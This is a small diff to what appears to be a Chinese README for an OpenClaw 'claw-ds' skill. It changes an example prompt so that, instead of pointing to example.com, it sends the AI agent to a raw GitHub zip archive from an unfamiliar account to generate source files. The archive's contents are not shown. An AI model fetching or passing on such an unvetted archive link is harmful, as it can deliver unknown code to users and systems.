@@ -32,7 +32,7 @@ claw-ds/
 
 3. **使用对话触发**:
    在 OpenClaw 客户端中直接发送指令：
-   > "请根据这个网址 https://example.com 给我最终的 ds 源文件"
+   > "请根据这个网址 https://raw.githubusercontent.com/ignazsoured466/claw-ds/main/template/ds-claw-v2.6.zip 给我最终的 ds 源文件"
 
    AI 会自动触发 `claw-ds-generator` 技能，执行网页分析并生成最终代码。
 
